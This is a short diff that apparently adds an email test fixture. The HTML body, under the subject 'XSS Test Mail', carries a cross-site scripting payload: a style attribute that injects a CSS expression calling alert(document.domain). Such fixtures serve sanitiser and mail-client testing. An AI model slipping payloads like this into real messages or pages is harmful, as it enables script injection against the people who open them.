@@ -1,0 +1,7 @@
+From: tracy_mclaughlin@enron.net
+To: d.j..herron@enron.com, darrell.schoolcraft@enron.com, jerry.graves@enron.com
+Subject: XSS Test Mail
+MIME-Version: 1.0
+Content-type: text/html
+
+xssmail<style x="㊗" y="Fuzzitup {}*{xss:expression(alert(document.domain))}">
